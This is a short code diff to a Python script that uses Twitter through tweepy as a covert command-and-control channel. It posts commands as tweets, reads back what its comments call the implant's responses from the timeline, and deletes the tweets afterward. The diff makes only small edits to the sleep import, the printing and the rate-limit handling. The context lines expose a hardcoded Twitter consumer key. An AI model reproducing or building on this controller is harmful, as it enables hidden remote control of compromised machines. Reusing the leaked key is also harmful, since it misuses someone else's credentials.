@@ -1,7 +1,7 @@
 import tweepy
 #from newEncrypt import *
 #import os 
-import time
+from time import sleep
 
 
 consumer_key = 'zLZ2NN1qemQChgVOae3QlgNtp'
@@ -36,25 +36,28 @@ while True:
 		#msg = encode(var) 
 		api.update_status(var)
 		#get and print implant response, might need timing feature
-		time.sleep(4)
+		sleep(4)
 		new_public_tweets = api.home_timeline()
 		app_count = app_count + 1
 		for tweet in new_public_tweets:
-			print 'hello' 
-			print tweet.text
+			#print 'hello' 
+			#print tweet.text
 			test = str(tweet.text)
 			#bytes = str.encode(test)
 			#type(bytes)	
 			#mess = decode(bytes)
 			print test
 			api.destroy_status(tweet.id)
-			if app_count == 4:
-        			print "Sleeping for 15 minutes..."
+			break
+			#api.destroy_status(tweet.id)
+			#sleep(3)
+			#if app_count == 4:
+        			#print "Sleeping for 15 minutes..."
         		
-        			app_count = 0
-        			sleep(61 * 15)
-        	else: 
-        		continue
+        			#app_count = 0
+        			#sleep(61 * 15)
+        	#else: 
+        		#continue
 				
 	
 	#delete all posts		
